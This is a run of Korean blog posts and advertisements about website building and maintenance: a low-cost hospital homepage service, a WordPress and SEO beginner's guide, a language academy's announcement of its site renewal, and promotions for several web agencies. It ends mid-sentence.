보셨을텐데요10여년 디자인제작 경험이 있는디자이너가 감각적이며 제대로 만든 디자인을합리적인 비용으로 사용가능한 병원사랑넷지금부터 소개해드릴게요!​ ​병원사랑넷은33만원의 거품없는 착한 구축비용과월 22000원의 저렴한 월사용료로부담없이 홈페이지를 사용하실 수 있습니다.병원홈페이지 제작이 고민되시는많은 원장님들!​그동안 큰 비용들 때문에내가 시작할까? 생각하신 분들도굉장히 많으실 것 같아요.​하지만 어떻게 시작하고  어디서부터관리 해야 되는지 막막해서 고민하시다병원사랑넷을 찾게 되신 분들도굉장히 많으시거든요!​병원사랑넷은 원장님의 부담은 줄이고좋은 퀄리티의 병원홈페이지 제작을도와드리기 위해 노력하고 있습니다.​ ​33만원의 비용으로PC와 태블릿,스마트폰용 홈페이지를볼 수 있는 반응형홈페이지가 구축되기 때문에 병원홈페이지를 이용하시는 고객님들이 어떠한 전자기기를이용하셔도 불편함없이 이용하실 수 있어편리하게 이용하실 수  있습니다.​홈페이지 수정 시스템을 제공하여메인화면 이미지 교체나 문구수정,콘텐츠,수정 등의 작업들은별도의 추가비용없이직접 쉽고 빠르게 수정하실  수 있어불필요한 시간을 줄이실 수 있습니다.​​ ​또한 작업 중 복구가 필요한 경우에도자동 북구 기능을 통해버튼 한번으로바로 원상복구를 간편하게 이용하실 수 있습니다.​또한 병원홈페이지 홍보에 이용할 수 있는팝업 제작 시스템은5분 이내 직접 빠르게팝업을 만들어 사용하실 수 있으며​팝업 시스템의 경우한변에 여러개의 팝업창 관리도가능하다는 점도 참고 해주세요:)​또,병원홈페이지 운영시게시판,회원가입,사이트맵,마이페이지 등에스킨 색상을 변경 할 수  있어다양한 디자인 스타일을 만들어낼 수 있습니다.한가지만 국한되어 있는 것이 아니라그 때마다 혹은 병원의 운영방식에 맞게다양한 스타일로 연출해낼 수 있습니다.​ ​병원을 찾는 환자의 상담이나진료예약서비스도 굉장히 중요하게 여겨지는 부분입니다.수기로 적고 기록을 하다보면놓칠 수 있는 부분들이 굉장히 많기 때문에이처럼 온라인 진료 예약 시스템의 도움을 받아조금 더 수월하게 운영하실 수 있습니다.​병원 예약시스템에는진료과목관리를 통해예약할 진료과목을 설정할 수 있고담당의관리가 있어 진료가 가능한 담당의사를추가,휴진 요일 설정도 가능합니다.또한 예약인원이나 예약가능한시간, 예외사간 등예약관련 기본 설정들이 자세하게구성되어 있어 병원 운영을안정적으로 관리하실 수 있습니다.​ ​예약일정관리도회원분들이 예약완료를 했을 때혹은 예약 취소 알림을문자 또는 메일로 발송가능하며짧은 문자13원 긴분자35원의저렴한 비용으로 이용하실 수 있습니다.​ ​홈페이지 제작을 돕는 자료수집용웹하드로 홈페이지 구축자료를편하게 전달하실 수 있으며​준비된 병원 홈페이지 사진이 부족할지라도 병원사랑넷에서사지고 있는 제작이미지를 통해병원홈페이지제작도 걱정하실 필요 없습니다.​또한 홈페이지 관리시 모르는 기능들은도움말 기능을 통해바로바로 확인하여빠르게 해결할 수 있습니다.​ ​합리적인 가격 월사용료 22,000원으로부담없이 이용할 수 있는병원홈페이지제작병원사랑넷에서 시작해보세요.:)​​ 병원사랑넷병원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.medi-love.net ​ 자신이 제작하고 관리할 수 있는 플렛폼에 관심이 뜨겁지만 정작 도전해 보려는 시도는 많지 않은 것 같습니다. 홈페이지 제작 관리 혼자서 가능한 워드프레스 소개와 웹사이트 만드는 방법에 관해 전체적인 얼게를 확인할 수 있도록 준비하였고 개인 홈페이지 제작에 워드프레스를 선택해야 하는 이유에 관해 개인적인 의견을 첨부합니다.​코로나 19 이후 우리 생활은 비대면 시대로 접어 들었고 코로나가 끝나더라도 이 추세는 이어질 전망이라고 경제 전문가들은 말하고 있습니다. 이런 상황에서 누구나 쉽고 빠르게 홈페이지를 만들고 관리할 수 있는 방법이 있는데도 처음 시작하는 도전이 두려워 시도 조차 하지 못한다면 아마 당신은 평생 이 분야에 대해서는 모르고 살아갈지 모릅니다. ​오늘 이 포스팅이 홈페이지 제작을 망설였던 수 많은 사람들에게 도전할 수 있는 메세지가 되기를 희망합니다. 참고로 필자는 2018년부터 워드프레스를 알게 되었고 누구의 도움도 없이 혼자서 테마와 플러그인 만으로 웹사이트를 제작하고 관리하고 있습니다. 물론 전문가 입장에서 보면 걸음마 단계의 코딩 실력일 수 있습니다. 하지만 중요한 것은 어떤 컨텐츠든 구현할 수 있고 검색엔진 최적화를 실현하고 있다는 부분이 아닐까요?​여러분도 지금 시작해도 절대 늦지않았고 기본적인 워드프레스 사용법을 익히면 각자의 상상력을 동원해서 다양한 디자인의 멋진 홈페이지 제작이 가능하다는 것을 필자의 경험으로 보장합니다.​하단의 링크들은 필자가 현재 관리하고 있는 워드프레스 홈페이지들로 지인의 회사 홈페이지와 워드프레스 초보자를 위해 정보를 공유하기 위해 새로 제작하고 있는 웹사이트 등입니다. 이 정도의 홈페이지 제작은 여러분도 가능하다는 것을 보여드리기 위해 공유하는 것이니 참고해 보시고 도전해 보시기 바랍니다.​워드프레스로 만든 기업 홈페이지워드프레스로 만든 정보 웹사이트 1워드프레스로 만든 정보 웹사이트 2 ​ 홈페이지 제작 관리 세계 1위 cms 워드프레스 세계에서 가장 많은 웹사이트 기반이 되는 cms(컨텐츠 관리 시스템) 워드프레스는 html, css 언어로 만들어진 프로그램입니다. 그런데 중요한 것은 코딩 언어를 사용하지 않고 테마와 플러그인을 통해 제작 관리가 가능하다는 것입니다. 사실 바쁜 일상 속에서 자신만의 플렛폼을 원하지만 그걸 위해서 코딩을 새로 공부한다는 것이 쉽지 않기에 많은 분들이 홈페이지 제작을 에이전시에 맡겨서 사용합니다.​그런데 관리 과정에서 수시로 프로그래머에게 무언가를 요구해도 바로 바로 처리되지 않는다는 것을 이용해 본 사람들은 누구나 알고 있습니다. 모르는 분야이기 때문에 시간이 얼마가 걸리더라도 기다리는 수 밖에 없었던 경험이 필자만의 생각은 아닐 것입니다. 저 또한 이 부분이 짜증나서 워드프레스를 공부하게 되었고 무려 3년 이상의 독학을 거치며 어느 정도 스스로 만든 홈페이지 디자인과 검색엔진 최적화 과정을 만족할 수 있게 되었습니다.​물론 저의 경우에는 무식하게 모든 것을 혼자서 해결하기 위해 이것 저것 많은 시도를 했기 때문에 많은 시간이 걸렸지만 지금 이글을 읽고 있는 여러분의 경우 최대 6개월 이내 위에 소개해드린 홈페이지 정도의 수준을 제작 할 수 있으리라 생각합니다. 그만큼 워드프레스는 기본적인 사용법만 알고 있다면 필수 플러그인과 테마가 제공하는 요소를 통해 어떤 웹사이트도 구현이 가능한 프로그램입니다.​현재 국내에서 대표적인 워드프레스 웹사이트는 삼성전자 홈페이지와 서울 시청 홈페이지라 할 수 있습니다. 과거와는 달리 현재 웹 에이전시에서도 워드프레스를 기반으로 홈쇼핑 웹이나 기업 홈페이지 제작을 선호하고 있는 이유도 워드프레스가 가진 장점이 많기 때문입니다. 우선 워드프레스로 제작되는 홈페이지는 단 기간에 완성할 수 있습니다.​일반적으로 웹사이트 하나를 완성하는데 1달에서 2달 정도가 소요되었던 과거와는 달리 워드프레스의 경우 능숙한 사람은 10일에서 15일만에 5개 이상의 페이지를 포함한 홈페이지를 제작할 수 있습니다.​또 하나의 워드프레스 장점은 다양한 컨텐츠 구현이 가능하다는 것입니다. 전문가가 아니더라도 모션 기능이 가능하고 모바일 최적화에 어려움을 느낄 이유가 없습니다. 즉 사용은 쉽고 제작 기간은 단축된다는 점이 워드프레스 홈페이지의 가장 큰 장점이라 할 수 있습니다. ​ 워드프레스를 이용한 홈페이지 제작 과정 워드프레스 웹사이트를 운영하기 위해서는 호스팅 과정부터 시작됩니다. 호스팅 업체를 선정하고 도메인을 생성한 후 서버에 등록하는 과정이 바로 호스팅의 핵심입니다. 이슈앤리뷰는 이미 호스팅을 통해 워드프레스 설치까지 가능한 해외 호스팅 업체를 이용해서 워드프레스를 시작하는 내용으로 포스팅을 발행한 바 있으니 참고 바랍니다.​호스팅 관련 정보 바로가기​워드프레스가 설치 되었다면 본격적으로 워드프레스 사용법에 관해 알아야하는데 첫 번째 과정은 알림판(어드민) 기능을 이해해야 합니다. 워드프레스는 해외 프로그램이라는 것 때문에 많은 분들이 어려워하는데 워드프레스 설치 후 한국어 설정과 한국 시간대 설정 이후 페이지 생성 및 첫 번째 포스팅을 발행하는 과정까지를 기본 사용법을 익히는 과정으로 볼 수 있습니다.​이 과정에서 여러분이 가장 중요하게 생각하고 이해해야 하는 것은 바로 테마와 플러그인 입니다. 워드프레스 제작과 관리를 위해서는 필수 플러그인 사용에 능숙해야 합니다. 필자가 선정한 필수 플러그인은 yoast, elementor, kboard, TinyMCE Advanced 등 총 7가지 정도입니다. ​워드프레스 필수 플러그인 확인하기​기본적인 워드프레스 사용법과 테마와 플러그인 설치가 완료 되었다면 이제부터 여러분의 상상력을 이용해서 홈페이지를 제작하는 단계가 시작된 것입니다. 사실 아무것도 모르는 상태에서 새로움을 창조하다는 것은 어렵습니다. 아니 불가능하다는 것이 더 맞을 것입니다. 혼자서 창조했다고 생각했던 디자인이 이미 있을 수 있기 때문이죠.​제가 여러분께 제안하는 가장 좋은 방법은 "모방"입니다. 처음 디자인을 시작하는 단계에서는 많은 웹사이트를 확인하고 자신이 구현할 수 있는 방법과 비교하면서 웹사이트에 적용해 보는 것입니다. 다양한 웹사이트 디자인을 확인할 수 있는 곳을 추천해 드릴테니 필자의 말을 참고로 도전해 보시기 바랍니다.​웹사이트 디자인 참고할 수 있는 곳​이런 과정을 통해 여러분의 워드프레스는 점차 뼈대를 갖추게 될 것이지만 중요한 것은 지금부터 입니다. 워드프레스가 가진 장점을 극대화 하기 위해서는 검색엔진 최적화를 통한 관리 방법을 알아야 합니다. 당신이 어떤 목적으로 홈페이지를 운영하려던 웹사이트를 이용하는 사람이 없다면 무용 지물이 될 것입니다. ​ 워드프레스 홈페이지 검색엔진 최적화 관리 방법 seo 관리라고도 부르는 검색엔진 최적화는 많은 웹사이트 운영자들이 가장 많은 고민을 하는 요소입니다. 결론부터 말하자면 정답은 없습니다. 다만 어떤 방식이 포털 검색에서 상위에 노출되는 확률이 높은지에 대한 의견들이 검색엔진 최적화 방법이라는 주제로 확인될 뿐입니다.​웹사이트를 운영하거나 블로그를 운영하고 있는 다수의 사람들이 검색 순위에 정보 노출하는 방법이라는 주제로 정보를 발행하지만 필자가 공감하는 내용은 다음과 같습니다.​1. 꾸준한 컨텐츠 발행을 통해 사이트 랭크를 올려야 한다.2. 크롤러가 색인을 용의하게 포털 웹마스터도구에 사이트를 등록하자.3. 이미지 속성은 결코 무시할 요소가 아니다.4. 가치 있는 정보를 제공하는 웹사이트를 포털은 결코 외면하지 않는다.5. 내부 링크와 외부 링크를 적절하게 이용하는 포스팅을 만들자 6. 타이틀을 선정하는 요령에 따라 유입률은 달라진다.7. sns를 활용할 줄 아는 관리자의 웹사이트는 강력한 무기를 가진 것이다.8. 지속적인 컨텐츠 발행을 위해 꾸준하게 생각하라.9. 웹 디자인과 이용자 재 방문은 연관성이 있다.10. 이슈앤리뷰가 제공하는 검색엔진 최적화 방법을 믿어보자 ㅎㅎ​기본적으로 많은 정보들이 있지만 대략 다음과 같은 내용들은 경험상 검색엔진 최적화에 도움이 된다고 생각합니다. 10번의 의미는 앞으로 블로그를 통해 포스팅 발행 방법에 관해 전달할 예정이라 그 부분에 관심을 두시고 확인하시는 것도 검색엔진 최적화에 도움이 될 것입니다.​끝으로 워드프레스 홈페이지 관리 과정에서 필자만이 알고 있는 검색엔진 최적화 방법은 원하는 페이지를 관련 키워드 상위에 노출할 수 있다는 것입니다. 물론 다양한 실험을 통해 확인된 방식이며 꾸준하게 관리할 경우 워드프레스 웹사이트가 네이버 관련 키워드 1면에 확인되는 것을 보실 수 있습니다.​지금까지 워드프레스를 이용해서 홈페이지 제작과 관리 방법에 관해 대략적인 얼게를 소개해 드렸습니다. 어떤가요? 여러분은 이번 포스팅을 통해 워드프레스로 홈페이지 만들기에 도전할 의향이 생겼나요? 만약 그렇다면 이슈앤리뷰가 끝까지 도와 드릴 것을 약속드리면서 오늘 포스팅은 이것으로 마치도록 하겠습니다. 오늘은 너무 기쁜 소식을 전해드릴 수 있게 되어 너무너무 기뻐요!!!! 😆​여러분! 드디어 여러분들께서 그렇게 기다리시던 홈페이지 리뉴얼이 확정되었습니다.​코로나 터지고 나서 계속 ​"이런저런 기능을 가진 솔루션 좀 만들어 주세요~" ​하고 여러 업체와 컨택하고 회의하고 그랬거든요! ​본래 거래를 하던 업체에도 양방향 시스템을 가진 실시간 화상 수업과 녹화 강의를 업로드해서 판매할 수 있는 인터넷 강의 시스템을 접목한 에듀솔루션 만들어 달라고 계속 말씀드렸는데,​드디어!​수년간 함께 해온 업체에서 제 바람과 같은 솔루션을 론칭 하셨어요! 👏👏👏​새롭게 바뀌는 가장 큰 변화❗️​1. 동시간대 여러 강사의 실시간 화상 강의 진행 가능!2. 하나의 홈페이지에서 인강(녹화강의)와 실시간 화상 강의 모두 가능!3. 홈페이지의 모바일 자동 연동으로 휴대폰, 태블릿에서도 모든 강의를 보다 편리하게 수강 가능!4. 수강 기간 동안 모든 실시간 화상 강의 복습 영상 제공은 당연히 덤!​사실상 저희는 코어 수업만 챙겨가는 형태였기 때문에 홈페이지를 크게 활용하지 않았어요.​아무래도 저희 아카데미는 제가 수업에 투입되어야 학생분들이 기뻐하시는 경향도 크고, 사실상 제 이름이 아카데미의 모든 것이라고 해도 과언이 아니다 보니...😅​그런데 제가 자꾸 너무 좋은 책을 내고 히히히, 그래서 활동하게 되는 필드가 넓어지고, ​우리 슬기 선생님의 능력치가 마구마구 상승해서 아카데미 코어 수업들을 다 맡길 수 있을 정도로 성장 하고 보니, ​우리들이 가진 자원을 무한대로 생성해낼 수 있는 우리들만의 공간이 필요하겠다는 생각을 많이 했어요. ​추가 강사 양성에도 그것이 더욱 도움이 될 것 같고요. (한국 외대 출신 선생님 스카우트한다고 아직도 목 빼고 기다리는 중입니다 음하하하)​그런데, 드디어 그런 간절한 마음이!!!!!!!!!!!! 이루어지네요ㅠㅠ ​간절히 바라면 이루어진다더니 너무너무 기뻐요!​제가 홈페이지 리뉴얼 한다고 1년 전부터 말씀드린 것 같은데, 제가 한다고 말한 건 반드시 하고야 만다고 말씀드렸죠? ​물론 홈페이지 리뉴얼이 늦어진 이유는 사실 여러 가지가 있었어요.​대형 학원 같은 경우에는 최소 매년 수천에서 수억하는 서버 유지 비용을 들여서 자체 서버를 구축해서 본인들이 원하는 시스템으로 자유롭게 활용을 할 수 있지만, 저희는 그럴 수가 없어요. ​더군다나 IT 전문가도 아니기 때문에 서버 관리, 데이터 관리, 홈페이지 관리 등에 전문가분들의 도움이 필요해서 임대형 홈페이지를 사용할 수밖에 없거든요. ​그런데 지금까지는 이러한 시스템을 모두 갖춘 임대형 솔루션이 국내에 없었고, ​얼마 전까지만 해도 이런 기능을 모두 갖춘 시스템을 만들어 달라는 저의 요청에 ​"조금 더 시간이 지나야 할 것 같다"라는 의견을 받았었어요.​제가 정말 국내에 있는 어지간한 솔루션 업체에는 다 전화해서 이런 홈페이지 기능 가진 솔루션 좀 만들어 주세요 하고 요청을 했거든요.​그런데 그때마다 듣는 대답은 ​"언제일지 장담할 수 없지만 언젠가는 만들어지지 않을까요?"​였고, 심지어 코로나 전부터 이런 이야기를 하는 저를 보고 어떤 분은 ​"대표님은 시대를 너무 앞서 가시네요~" ​라고 😂​왁... 빠르게 변화하는 이 시대가 내 눈에만 위기로 보이는 건감? 빨리 바뀌어야 할 것 같은데? 하면서 랑무룩 하였다는 호호호 ​홈페이지 리뉴얼 때문에 계속 고민하고, 방법을 찾고, 업체를 알아보고, 업체와 상담하고 회의하고, 요청하고 그것만 1년 넘게 한 것 같아요! ​그런데 드디어 결실을 보네요!​새로운 시스템으로 이전하는 거라 최소 9월은 되어야 적용될 거라고 하셨는데,​제가 기존 데이터 하나도 안 옮겨 주셔도 되고, 회원도 새로 그냥 다 모집할 테니까 지금 도메인으로 새 홈페이지 세팅만 해달라고 말씀드렸어요.​그래서 내부 회의해보시고, 최대한 빨리 구축할 수 있게 도와주신대요! ​오랫동안 함께 해온 업체라서 사실 신뢰가 높기도 하고, 저도 같이 일했던 분들이랑 계속 일하는 게 마음이 편하잖아요 ㅎㅎㅎ 서로 잘 알다 보니 전화 주고받는 것도 확실히 편하고요. ​참 이래저래 너무너무 행복한 하루입니다!​새로운 시스템으로 바뀌면 새로운 가격 정책에 따라서 비용이 두 배 이상 오르겠지만, 올해까지는 기존 고객들에게 같은 요금으로 적용해 주신다고 해서...​정말 성은이 망극하옵나이다.​이제 석사반 뿐 아니라, 수능 중국어, 승무원 중국어, 신 HSK, 중국어 회화 전부 다 저희와 함께 하실 수 있도록 부지런히 홈페이지 확장해보겠습니다!​또 누가 아나? ​🎵중국어 안되면 사랑쌔엠닷컴~🎶​.하고 광고하는 날이 올지 ㅋㅋㅋ​마음 같아서는 송중기 배우를 모델로 쓰고 싶다... (중기야 잘 있니? 다음 작품은 언제 나오니? 누나가 목 놓아 기다릴게 ㅎㅎㅎ 소곤소곤 반말해서 죄송합니다... 이거슨 마음의 소리이리이~)​올해 매출 10억이 목표였는데.. 정말 그렇게 될지도 모르겠군 핳핳핳핳핳핳​두드리라! 그리하면!열리리라!에이메엔!​ ​ 홈페이지관리에서 가장 중요한 부분이 무엇일까요?단순히 텍스트 수정해주고 이미지, 팝업창 제시간내에 잘만들어 주는것일까요? 물론, 이런 기본적인것 마저도잘 안지키는 업체가 얼마나 많습니까?홈페이지관리는 전문적인 가치창출을 할줄아는 전문 아웃소싱업체에 맡겨야 한다고 생각합니다. 그러기 위해서는 의뢰고객께서도 무작정 돈에만 너무 치우치지 마시고 진정으로 잘할수 있는 업체를선정하셔야합니다. 물론, 텍스트 몇개 변경하고 이미지 수정하는데 무슨 가치를 생각하느냐, 빠르게 잘해주고 돈 저렴하면되는거지... 라고 생각할수도 있습니다. 그렇게까지만 생각하신다면 할수 없지만, 진정한 의미에서 홈페이지관리는 포괄적인 개념으로 단순한 요구사항에 대응하는 수동적인 관리를 탈피하여 의뢰업체가 먼저 제안하고 능동적이고 적극적인 태도를 보임으로써 의뢰업체와 신뢰를 쌓고더 나아가 홈페이지가 정말 자사의 귀중한 홍보책, 없어서는 안될 영업망으로써의 일등공신이 될수 있도록 최상의 역할수행이이뤄지도록 함께 노력해 나가야 합니다. 요즘 연예인들 이름을 걸고 쇼핑몰을 개설해서 하루에 몇천만원 버니 그런얘기를 많이 접합니다.우리들은 그러한 명예도 없고 그렇다고 자본이 충분하지도 않습니다. 그래서 우리가 성공하기 위해서는 MH마케팅, 즉, 맨땅에 헤이딩하는식의 전략이 필요합니다. 그러한 전략을 함께 고민하고 함께 풀어나가야 하는 업체,동반자가 바로 홈페이지관리업체들이라고 생각합니다.이 업계가 진입장벽이 낮다보니 그동안 숱한 사람들이 무모한 도전으로 왔다가 갔습니다. 그냥 가면되는데 물을 많이 흐려놓고 떠났습니다. 경험과 경력이 없으니 가격을 낮추고, 우선먼저 계약만 하면 그만이고, 돈 받으면 언제 그랬냐는 식의 배째라식 경영 마인드.이런경험들을 안타깝게도 의뢰했던 업체들이 함께 겪었습니다. 그래서 요즘 전화로 들여오는 목소리속에는 그러한 암울했던 회상이 함께 섞여서 들리곤 합니다. 아무리 진실을 얘기하고 성공적인길로 안내를 해드릴려고 해도 그때의 기억은 쉽게 잊혀지지 않는듯 별로 시큰둥한 반응들입니다. 의뢰업체를 선정할때 반드시 관리업체의 사장 또는 대표와 직접 상담을 하신후 담당자와 상담을 하시기 바랍니다.담당자가 아무리 잘설명하고 잘해준다고 해도 대표의 마인드가 부족하다면 뜬 구름에 지나지 않습니다.대표가 그런 하찮은 일들까지 내게 상담을 해야 하는가 하는 느낌을 받는다면 거래를 하지 마시기 바랍니다. 세상에는 하찮은일 하나도 없는듯합니다. 또한, 거래업체에서도 이런 조그만 일들을 대표가 상담할 정도로 규모가 작거나, 직원들 교육이 안되어 있나? 이렇게 판단하지마시고가장 중요한게 무엇인지 먼저 고민하시고 의뢰업체의 제일 전문가이고 경험이 많은 대표와 직접 상담하실것을 권합니다.대표는 그 업계에서 가장 많은경험과 성공적인 충분한 노하우를 가지고 있습니다. 세계 곳곳에 10만명의 영업사원이 활동한다고 생각해 보세요. 그 어마어마한 인력도 홈페이지를 당해낼수 없습니다.홈페이지가 그 수십,수백배의 역할도 거뜬히 감당할수 있습니다.이렇게 중요하고 황금알을 낳게 할수 있는 거위인데도  아직도, 있으면 좋고 없으면 서운할 정도의 홈페이지를 운영하고 계시다면빨리 없애버리시기 바랍니다. 이미지 추락합니다. 단돈 1만원도 아깝습니다. 저희는 홈페이지 가치를 아시는 분들과 거래하고 싶습니다.홈페이지가 세계곳곳의 10만여명의 유능한 영업사원이 될수 있도록 써포트해 드리겠습니다.웹아웃소싱 이지테이크     홈페이지제작을 고려 중이시라면 먼저 비용이 궁금하실 것 같은데요. 먼저 저희 기준으로 말씀드리면 기본 제작비는 143만원입니다. 이 비용이 저렴하다고 생각하는 분도 있을 것이고 저렴하지 않다고 생각하는 분도 있을 건데요. 중요한 건 이너웹에서 이미 제작하신 분들이 저렴하다고 많이 말씀하십니다.​이너웹은 지금까지 다양한 업종의 홈페이지를 200개 이상 만들었으며 많은 고객분들을 만나보았습니다. 그중 원치 않게 홈페이지가 갑자기 사라지거나, 제작 업체의 소홀한 관리로 인해 홈페이지를 새로 만드는 분들도 정말 많았습니다.​이야기를 들어보면 홈페이지제작업체가 사라지거나 관리가 안 되는 곳들의 공통점은 터무니없이 낮은 홈페이지제작 비용, 신규 제작에만 공을 들이는 영업방식에 의존하는 곳이었습니다.​​ 이너웹 고객님들의 수정요청 상황홈페이지는 제작도 중요하지만 제작 이후 관리가 더 중요한데요. 홈페이지는 그 회사에 대해 신뢰성을 갖게하는 얼굴이기 때문입니다. 홈페이지 관리가 잘 되어야 잠재 고객들의 신뢰성이 높아지고 인터넷마케팅의 전환 효과도 높여주는 것입니다.  강서구홈페이지제작 이너웹에 대해 더 알고 싶으시면 아래 홈페이지에서 포트폴리오. 이용후기, 홈페이지제작 서비스 설명도 있습니다. 문의사항은 언제든지 연락 주시면 성심껏 상담해 드리겠습니다. ​​​​이너웹 : http://www.innerweb.kr 이너웹 - 홈페이지제작홈페이지제작업체, 반응형웹, 모바일웹, 쇼핑몰, 실시간 유지관리, 온라인 마케팅 지원www.innerweb.kr 궁금할 땐 네이버 톡톡하세요! ​ 홈페이지관리업체 브랜드가치를 높이는 기적컨설팅​​홈페이지를 만들게 되면 여러가지를 생각하게됩니다. 제작전에는 어떤 업체를 통해 제작을해야하고 우리 회사의 전략을 잘 나타내 줄 수있는 디자인을 선택하는지 등을 고려합니다.​그런데 홈페이지제작도 어렵지만, 제작 후관리도 어려울텐데 자체적인 인력으로관리가 가능할까 고민하실 수 있습니다.​​ ​​웹사이트는 사람들에게 눈에 쏙 들어올 수 있게제작하는 것도 중요하지만 복잡하지 않고한 눈에 들어오게 제작해야 고객들의 반응이좋고 매출상승에도 도움이 됩니다.​하지만 많은 분들이 홈페이지제작과정에서망설이고 있는 것을 보게 되는데요. 홈페이지는 잘 만드는 것도 중요하지만 꾸준하게 관리와 보수, 유지가 정말 중요합니다.​제대로 관리되지 않는다면 노후화나 낙후될 수 밖에 없기 때문에 홈페이지를 제작한타 경쟁업체에 비해 뒤처질 수 있습니다.​​ ​​홈페이지를 관리하는 방법에는 두가지가 있습니다.​첫번째는자체적으로 관리직원을 두어관리하는 방법입니다.​관리직원을 두게 되는 경우 각 분야의 전문가를 뽑아야 하기에 인건비가 발생하게 되며다방면으로 일을 할 수 있는 직원 한 명을뽑아서 인건비를 절약하는 방법이 있지만체계적으로 관리하기란 쉽지 않을 것입니다.​​ ​​두번째는홈페이지관리업체를 통해관리하는 방법입니다.​자체적으로 관리가 어려우니 웹사이트를전문적으로 유지, 관리를 해주는 업체를통해 관리를 받고 계십니다.​제작을 제대로 하는 전문업체에 맡겨야그만큼 유지 관리부분에 있어서도 노하우가있기 때문에 업체를 고르실 때는 경력이나실력을 잘 살펴보고 선정하시는 것이 좋습니다.​​ ​​홈페이지관리업체 기적컨설팅에서는 웹사이트 제작 뿐만 아니라, 마케팅도 함께진행하고 있는데요. 홈페이지를 제작하게되면 마케팅과 관련된 컨설팅까지 같이받아볼 수 있습니다.​다양한 웹사이트 제작 경험을 바탕으로쌓인 경험과 노하우를 가지고 감각적인 디자인으로 구축하고 있는데요.​홈페이지의 종류에 해당하는 반응형홈페이지도 제작하고 있어 고객이 찾는홈페이지를 만나보실 수 있습니다.​​ ​​다양한 의뢰를 통해 쌓인 노하우를 바탕으로지금 이 순간에도 꾸준히 발전하고 있는기술력을 가지고 홈페이지를 제작하고 있으며트렌디하면서 감성까지 담아내는 웹사이트를구축하고 있는 기적컨설팅!​홈페이지를 제작도 하지만 유지보수도 가능한데요.  웹사이트는 제작하고 끝이 아닌,끝까지 관리하는 것이 중요합니다.​​ ​​따라서 홈페이지를 통해 고객과 소통할 수있도록 게시판이나 위젯을 연결하여 회사의매출상승을 함께 도와드리고 있습니다.​고객이 원하시는 니즈에 맞춰 트렌디한감각까지 가미한 고객 맞춤형 디자인으로제공되고 있기에 만족도 높은 제작결과를직접 받아보실 수 있습니다.​기적컨설팅은 좋은 과정이 좋은 결과를만든다는 것을 잘 알고 있습니다.​​ ​​따라서 고객의 시선을 이끌 수 있는 홈페이지를세부적인 단계를 통해 제작하고 있는데요.​각 사업이 나타내는 웹사이트 상의 성향과특성을 충분하게 파악하고 연구할 수 있는시장조사과정을 첫번째로 거칩니다.​두번째로 고객의 니즈와 사업의 특성을체계적으로 파악하여 기적컨설팅만의독창적인 컨셉을 기획하게 됩니다.​​ ​​홈페이지의 컨셉이 정해졌다면 본격적으로홈페이지개발에 들어가게 되는데요.​이 과정에서는 다양한 경험과 노하우를 갖추고 있는 기획자, 디자이너, 퍼블리셔가 한팀을 이뤄 홈페이지제작을 진행하게 됩니다.​홈페이지가 제작되었다면 반복적으로테스트를 진행하여 오차가 없도록 제작하고있으며 오탈자나 변경사항이 없는지 세심하고 꼼꼼하게 살피고 있습니다.​​ ​​홈페이지 내에는 회사의 위치를 나타낼 수 있는지도가 기본적으로 구성되어 있습니다.​기적컨설팅에서는 어설픈 지도 한 장을 올리는것이 아닌, 확대나 축소, 드래그가 가능한카카오 지도를 연동하여 간편하게 홈페이지를이용할 수 있도록 도와드리고 있습니디.​이러한 체계적이고 꼼꼼한 기적컨설팅에서홈페이지를 제작하고 관리해보시면 어떨까요?​​ ​상단사진을 클릭하시면 기적컨설팅만의다양한 홈페이지제작 결과물을 보실 수 있습니다.​ ​기적컨설팅의 홈페이지를 통해 지금까지 제작해왔던 다양한 포트폴리오를 직접 보실 수있으며 견적문의도 사진을 클릭하시면 편안하게 받아보실 수 있습니다.​또한 카톡친구추가를 통해서도 간단한 상담​이가능하니 편하신 방법으로 문의주시면 됩니다 :)​    브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작브랜드컨설팅, 홈페이지제작, 사진촬영, 홍보영상제작, 디자인, 인테리어, 홍보인쇄물, 광고기획, 마케팅, 간판제작www.mmcmso.com 기적컨설팅서울특별시 강남구 도산대로 176 대광빌딩 3층 기적컨설팅 ​ 홈페이지관리업체 체계적으로관리해주는 곳에서 시작하세요​​홈페이지는 잘 만드는 것도 중요하지만 꾸준하게 관리, 보수, 유지를 하는 것도 중요합니다.이는 제작하는 것만큼이나 신경써야 하는데요.​홈페이지를 구축했지만 제대로 관리하지 않는다면 노후되거나 낙후될 수 있고, 온라인시장안에 있는 경쟁업체들 속에서 뒤처지게 됩니다.​또한 홈페이지를 방문한 고객들이 현재의트렌드에 맞춘 디자인과 구성이 아니라면방문했다가 다시 나오게 되는데요.​​ ​​따라서 홈페이지를 관리하는 방법에는 두가지선택조항이 있는데, 첫번째는 자체적으로관리직원을 두어 관리하는 방법입니다.​기업 내에서 자체적으로 홈페이지관리직원을두게 되는 경우 각 분야의 전문가를 뽑아야 하며,기존 직원에게 관리를 맡기게 되면 빠르게 변화하는 온라인시장을 파악하지 못해 트렌드에뒤처지게 될 것입니다.​다방면으로 잘 관리할 수 있는 직원을 뽑아인건비를 절약하는 방법도 있지만 체계적으로 관리하는 것은 쉽지 않습니다.​​ ​​따라서 많은 분들이 홈페이지관리업체를 통해유지보수, 관리를 받고 계십니다.​웹사이트제작을 제대로 하는 전문업체에 맡겨야유지, 관리 부분에 있어서도 노하우를 갖추고있기 때문에 업체를 선정하실 때는 경력이나실력을 잘 살펴보시고 선정하시는 것이 좋습니다.​홈페이지는 회사의 간판이라고 생각하시면더욱 중요성이 와닿을 것 같은데요.​​ ​​소비자가 궁금증을 가지고 회사명을 검색해보았을 때 따로 홈페이지 주소가 나오지 않는다면 회사에 대한 신뢰도를 쌓기 어렵습니다.​따라서 필수적으로 제작해야 할 홈페이지는누구나 제작하는 것이 아닌 전문가들의도움을 받아 꾸준히 관리하는 것이 중요합니다.​마케팅의 시작점이라 여기는 홈페이지는 소비자가 온라인 상에서 어떠한 사이트를 선택했을때 먼저 확인할 수 있는 페이지로서 보통 홈페이지의 주소를 사용하게 되는데요.​​ ​​일반적으로 홈페이지를 기획할 때 호스팅 설치가반드시 필요합니다. 호스팅은 사업자가 자신들의웹 서버를 개인 또는 개별 업체에 제공하거나임대해 주는 것을 말하는데요.​쉽게 말해, 홈페이지를 집이라고 생각했을 때호스팅은 집을 지을 수 있는 땅을 빌리는 것을호스팅이라고 하는 것입니다.​따라서 홈페이지를 기획하기 위해서는 호스팅이 반드시 필요한 